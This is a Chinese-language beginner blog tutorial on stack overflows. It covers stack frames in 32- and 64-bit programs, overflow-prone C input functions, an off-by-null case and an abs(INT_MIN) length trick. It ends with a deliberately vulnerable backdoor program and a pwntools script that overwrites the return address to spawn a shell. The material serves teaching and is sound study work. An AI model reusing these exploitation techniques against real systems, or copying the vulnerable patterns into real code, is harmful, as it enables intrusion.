<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0068d7"><meta name="author" content="ZLTT"><meta name="copyright" content="ZLTT"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>从0开始学pwn-1-栈溢出 | ZLTT的博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/yun.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer></script><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><link rel="icon" type="image/png" href="/pic/favicon.ico"><link rel="mask-icon" href="/pic/favicon.ico" color="#0068d7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"zltt197.github.io","root":"/","title":"竹林听涛","version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"/say.json"},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="stylesheet" href="/css/bg.css"><script src="/js/bg.js" defer></script><meta name="description" content="溢出是二进制中最为基础也最常见的漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="从0开始学pwn-1-栈溢出">
<meta property="og:url" content="http://zltt197.github.io/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
<meta property="og:site_name" content="ZLTT的博客">
<meta property="og:description" content="溢出是二进制中最为基础也最常见的漏洞">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012117511.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012117938.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011855037.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011857356.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012118506.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012118880.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012118455.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011929725.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011938493.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011940528.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011943771.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012119840.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111011955672.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012119019.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012006063.png">
<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012115544.png">
<meta property="article:published_time" content="2021-10-31T16:00:00.000Z">
<meta property="article:modified_time" content="2021-10-31T16:00:00.000Z">
<meta property="article:author" content="ZLTT">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/zltt-tc/image/raw/master/202111012117511.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ZLTT"><img width="96" loading="lazy" src="/pic/zltt.png" alt="ZLTT"></a><div class="site-author-name"><a href="/about/">ZLTT</a></div><span class="site-name">ZLTT的博客</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">前置知识复习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88"><span class="toc-number">1.1.</span> <span class="toc-text">什么是栈?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%84%8F%E4%B9%89%E4%B8%8A%E7%9A%84%E6%A0%88"><span class="toc-number">1.1.1.</span> <span class="toc-text">数据结构意义上的栈</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%88%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">栈的定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%88%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">栈的特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">相关概念</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%84%8F%E4%B9%89%E4%B8%8A%E7%9A%84%E6%A0%88"><span class="toc-number">1.1.2.</span> <span class="toc-text">程序运行意义上的栈</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-number">1.2.</span> <span class="toc-text">栈是怎么工作的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">1.2.2.</span> <span class="toc-text">64位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.3.</span> <span class="toc-text">栈帧结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">栈溢出的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8F%91%E7%94%9F"><span class="toc-number">2.2.</span> <span class="toc-text">溢出的发生</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.</span> <span class="toc-text">溢出的实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">附件</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://zltt197.github.io/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ZLTT"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ZLTT的博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">从0开始学pwn-1-栈溢出</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2021-11-01T00:00:00+08:00">2021-11-01</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">从0开始学pwn</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">网络安全</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0068d7;"><h2 id="前置知识复习"><a href="#前置知识复习" class="headerlink" title="前置知识复习"></a>前置知识复习</h2><h3 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈?"></a>什么是栈?</h3><h4 id="数据结构意义上的栈"><a href="#数据结构意义上的栈" class="headerlink" title="数据结构意义上的栈"></a>数据结构意义上的栈</h4><h5 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h5><p>在数据结构的表述中,栈是一种线性存储结构,其运算受到限制,使得只能在其一端执行数据操作</p>
<p>简而言之,就像是一叠书放在桌子上,你想要放书,只能放在最顶上(进栈操作),想要拿书,也只能拿最顶上的书(出栈操作),而这叠书的顶就称之为栈顶,底部就称为栈底</p>
<h5 id="栈的特点"><a href="#栈的特点" class="headerlink" title="栈的特点"></a>栈的特点</h5><p>1.后进先出(即更先入栈的元素更后出栈,英文为last in fast out,简写为LIFO)<br>2.线性存储(可以通过下标直接索引到每个元素)<br>3.受限访问(只能操作栈顶)</p>
<h5 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h5><p>1.栈顶<br>2.栈底<br>3.入栈(又称为压栈或进栈)<br>4.出栈(又称为弹栈)</p>
<h4 id="程序运行意义上的栈"><a href="#程序运行意义上的栈" class="headerlink" title="程序运行意义上的栈"></a>程序运行意义上的栈</h4><p>基于栈这种数据结构的特性,其被大量运用于现代编程语言实现函数调用传参和局部变量分配等功能(初学者可能不太懂,没关系,后面会有详细的解释)<br>程序在运行开始时,会由操作系统分配给一块内存,这块内存使用了栈的数据结构,被用于支持程序的参数传递上下文和局部变量分配,该内存被称为程序的运行栈,亦可简称为栈</p>
<h3 id="栈是怎么工作的"><a href="#栈是怎么工作的" class="headerlink" title="栈是怎么工作的"></a>栈是怎么工作的</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>我们使用一个简单的程序,来观察32位下一次函数调用过程中栈的作用</p>
<pre><code class="c">#include&lt;stdio.h&gt;

void fun(int a1,int a2,int a3,int a4,int a5,int a6,int a7,int a8)
&#123;
    int b1;
    int b2;
    int b3;
    int b4;
    int b5;
    int b6;
    b1=1;
    b2=2;
    b3=3;
    b4=4;
    b5=5;
    b6=6;
&#125;

int main()
&#123;
    fun(1,2,3,4,5,6,7,8);
    return 0;
&#125;
</code></pre>
<p>让我们编译一个32位的程序,用反编译器看一看</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012117511.png" loading="lazy"> </p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012117938.png" loading="lazy"> </p>
<p>可以看到,在正式call进fun函数之前,push将传入的参数保留在栈上,在进入函数后,有sub esp,0x20分配局部变量空间</p>
<p>让我们动态调试这个程序,以更加清晰的观看一次函数调用的全过程</p>
<p>首先,运行到调用fun之前</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011855037.png" loading="lazy"> </p>
<p>可以看到栈顶(esp)和栈底(ebp)都在0xffffcc78,其下是一些程序运行的上下文和其它信息</p>
<p>在运行到call fun之前,fun函数的所有参数都入栈了</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011857356.png" loading="lazy"> </p>
<p>call进去,call会在栈上保存函数的返回地址(也就是call指令的下一条,在这里是0x80491c5),这个地址是函数退出时返回的凭据</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012118506.png" loading="lazy"> </p>
<p>进入函数后,最先要做的是脱离原先函数的栈框架,建立函数自己的栈帧框架,所以会先保存原栈帧的栈底(push ebp),再将esp的值赋给ebp(mov ebp,esp),自此,fun函数脱离了main函数的栈帧</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012118880.png" loading="lazy"> </p>
<p>紧接着,就是分配函数局部变量空间(sub esp,0x20)</p>
<p>至于为什么这里明明fun函数只有6个int类型的局部变量,按道理应该分配4*6=24字节,却分配了32个字节,原因是为了保证读写速度,因为如果内存地址是16的倍数(即十六进制表示末位为0)读写会更快,故而每次分配局部变量空间,都会进行栈对齐,多分配一点<br>可以看到,对齐过后esp(0xffffcc30)和ebp(0xffffcc50)的十六进制末位都为0</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012118455.png" loading="lazy"> </p>
<p>这里esp和ebp之间32个字节的空间就是被分配给函数的局部变量空间(之所以有乱七八糟的内容,是因为我没有给这些变量初始化)</p>
<p>到这里,进入函数的步骤就结束了,再让我们看看退出函数的步骤</p>
<p>先运行到退出函数的地方(函数的局部变量已经在运行过程中改变,当然,因为对齐多分配的8个字节0xffffcc30-0xffffcc37没有变)</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011929725.png" loading="lazy"> </p>
<p>leave是一条复合语句,相当于”mov esp,ebp;pop ebp;”,可以发现,其实就是进入函数时那两句(“push ebp;mov ebp,esp;”)的逆操作</p>
<p>“mov esp,ebp”回收了fun函数分配的局部变量空间,”pop ebp”恢复了main函数的ebp</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011938493.png" loading="lazy"> </p>
<p>到了ret指令了,ret指令和call指令是成对的指令,call指令压栈返回地址并进入函数,ret指令弹栈返回地址而退出函数</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011940528.png" loading="lazy"> </p>
<p>执行完ret过后,你会发现栈结构与执行call之前是完全一致的了,而此时的指令寄存器eip指向的位置正是之前栈中的返回地址(0x80494c5)</p>
<p>最后,由main函数来清理栈中剩下的传参(add esp,0x20)</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011943771.png" loading="lazy"> </p>
<p>此时,栈结构完全恢复为调用fun函数之前的状态</p>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>64位下的程序栈和32位大差不差,主要只有几个区别</p>
<p>1.地址单元长度从4个字节变成8个字节,这很好理解,一个字节就是8位,所以32位是4个字节,64位是8个字节</p>
<p>2.函数的前六个参数不再从栈传递,而是由寄存器传递(依次由rdi,rsi,rdx,rcx,r8,r9传递),从第7个起,再由栈传递,栈传递方式和32位一致</p>
<p>主要是前六个参数传递的寄存器变化,由于其实鲜有函数具有6个以上的参数,所以64位下据大多数参数传递都是寄存器传递的</p>
<p>使用上面的代码再编译一个64位程序,来感受一下区别</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012119840.png" loading="lazy">  </p>
<p>动态调试一下也可以感受到不同</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111011955672.png" loading="lazy"> </p>
<p>可以看到,我已经运行到了call之前,栈上只有7和8这两个参数</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012119019.png" loading="lazy"> </p>
<p>而前6个参数,依次由rdi,rsi,rdx,rcx,r8,r9传递</p>
<p>除此之外,64位和32位也无太大区别,故不再赘述</p>
<h4 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h4><p>通过上面的过程,我们可以发现,每个函数在运行栈中,都有自己的一小段栈空间,我们称之为函数的栈帧,函数栈帧的结构是这样的</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012006063.png" loading="lazy"> </p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="栈溢出的原理"><a href="#栈溢出的原理" class="headerlink" title="栈溢出的原理"></a>栈溢出的原理</h3><p>在上面复习到的栈帧结构中,我们可以发现,函数在返回时,依赖于返回地址来回到原函数<br>而在栈上,局部变量,原函数栈底,和返回地址这三个东西,距离相当接近<br>假如在读写某个局部变量时,由于程序员的不谨慎,导致了越界,读写到了其他变量,使用者就可以篡改其他变量的值<br>更有甚者,读写到了返回地址,导致使用者可以篡改返回地址,这样函数返回的时候就会由于返回地址错误,而跳转向错误的地址!<br>这个两个过程,就是最基础的栈溢出篡改变量和栈溢出劫持程序执行流</p>
<h3 id="溢出的发生"><a href="#溢出的发生" class="headerlink" title="溢出的发生"></a>溢出的发生</h3><p>在C语言的一些读入函数中,没有限制读入大小,这些函数往往就是溢出的高发地(不只是栈溢出,还包括其它类型的溢出)</p>
<pre><code class="c">scanf(&quot;%s&quot;,buf);
gets(buf);
</code></pre>
<p>还有一些时候,限制了读入大小,但是大小超过了应该有的大小</p>
<pre><code class="c">char buf[16];
read(0,buf,48);
</code></pre>
<p>更有些时候,是由于程序员本身对底层不够了解造成的溢出,这里我举两个例子</p>
<p>第一个例子</p>
<pre><code class="c">char buf[32];
char str[16];
if(read(0,buf,32)&lt;=16)
&#123;
    strcpy(str,buf);
&#125;
</code></pre>
<p>在这个例子中向buf读取最多32个字节,如果读取的字节数少于等于16个字节,就将读入的内容复制到str中</p>
<p>但是这里有两个问题</p>
<p>1.我并为给buf进行初始化,buf中会残留有栈上的其他变量值,当strcpy在复制的时候,必须遇到一个字节的\0结束符才会停止,但read在读入的时候,并不会在字符串后面加一个0字节,我这里也没有给buf做初始化,也就是说,假如我输入了16个字节,那么strcpy在复制完这16个字节之后,还会复制接着buf上的残余变量!</p>
<p>2.即便我把这里的buf初始化为0,也还是有问题的,因为strcpy实际复制的长度是字符串长度加上末尾的\0,一共最多17个字节,超出了str的上限(16个字节),发生了一个字节的零溢出(也就是我们说的off by null)</p>
<p>第二个例子</p>
<pre><code class="c">int size;
char buf[24];
scanf(&quot;%d&quot;,&amp;size);
read(0,buf,(abs(size))%24)
</code></pre>
<p>乍一看之下这个例子几乎无懈可击,获取一个数字,将其的绝对值对24求余作为长度,怎么想都不会超出24的,对吧?</p>
<p>希望你还记得,C语言是用补码表示负数的,而通过补码求负数的绝对值怎么求?再求一次补码,即取反再加一</p>
<p>那么问题来了,我们都知道,int类型表示数的时候,能表示的负数事实上比正数要多一个(因为符号为1的数全部都是负数,但是符号位为0的数有一个是0,其他的才是正数),那么多出来的这个数(-2147483648)求补码会怎么样呢?</p>
<p>1000 0000 0000 0000 0000 0000 0000 0000<br>取反<br>0111 1111 1111 1111 1111 1111 1111 1111<br>加一<br>1000 0000 0000 0000 0000 0000 0000 0000</p>
<p>它又变回去了!因为数字位溢出到了符号位,所以这个数经过abs之后还等于它自己!</p>
<p>而再对24求余,还是一个负数,再传入read,由于read函数接受的第三个参数实际上是unsigned int,这里将发生一个隐式类型转换,一个int类型的负数将变成一个极其巨大的unsigned int正数!</p>
<p>所以在这里,向size输入-2147483648,能获得一个极其巨大的输入长度(至少2147483648的长度)</p>
<h3 id="溢出的实例"><a href="#溢出的实例" class="headerlink" title="溢出的实例"></a>溢出的实例</h3><p>这里我们使用一个简单的例子来进行一个栈溢出攻击演示(为了演示效果,我关闭了编译时的所有防御)</p>
<pre><code class="c">#include&lt;stdio.h&gt;

void backdoor()
&#123;
    system(&quot;/bin/sh&quot;);
&#125;

void vul()
&#123;
    char buf[16];
    gets(buf);
&#125;

int main()
&#123;
    vul();
&#125;
</code></pre>
<p>使用python的pwntools模块辅助我们进行攻击</p>
<pre><code class="python">from pwn import *

p=process(&quot;./栈溢出简单实例&quot;) #启动程序
backdoor=0x0040115b #这是后门函数的地址

payload=b&quot;a&quot;*16 #先用16个字节填充整个buf的空间
payload+=b&quot;a&quot;*8 #这8个字节用于覆盖掉保存的原函数的rbp
payload+=p64(backdoor) #用后门函数覆盖掉函数的返回地址

p.sendline(payload) #发送payload
p.interactive() #进入交互模式
</code></pre>
<p>打一下</p>
<p><img src="https://gitee.com/zltt-tc/image/raw/master/202111012115544.png" loading="lazy"> </p>
<p>可以看到,我成功执行了system(“/bin/sh”),这是原本程序流程中不会启动的函数,标志着这次攻击的成功</p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>本篇博客所有使用到的代码和程序均可在以下链接获取</p>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/10VzwZvSC9XHTQ5Cj558JRw">百度云</a>  密码: e034</p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ZLTT</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://zltt197.github.io/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="从0开始学pwn-1-栈溢出">http://zltt197.github.io/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/11/14/gdb%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="prev" title="gdb(with pwndbg)常用命令"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">gdb(with pwndbg)常用命令</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-0-%E5%AD%A6pwn%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/" rel="next" title="从0开始学pwn-0-学pwn前的准备"><span class="post-nav-text">从0开始学pwn-0-学pwn前的准备</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div id="waline"></div><script>Yun.utils.getScript("/js/waline.js", () => {
  const walineConfig = {"enable":true,"serverURL":"https://blog-talk-api.vercel.app/","comment":false,"avatar":"mp","avatarCDN":"https://cn.gravatar.com/avatar/","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/alus","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq"],"el":"#waline","lang":"zh-CN"}
  walineConfig.path = "/2021/11/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-1-%E6%A0%88%E6%BA%A2%E5%87%BA/"
  walineConfig.dark = 'html[data-user-color-scheme="dark"]'
  new Waline(walineConfig)
}, window.Waline);</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> ZLTT</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0068d7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div></body></html>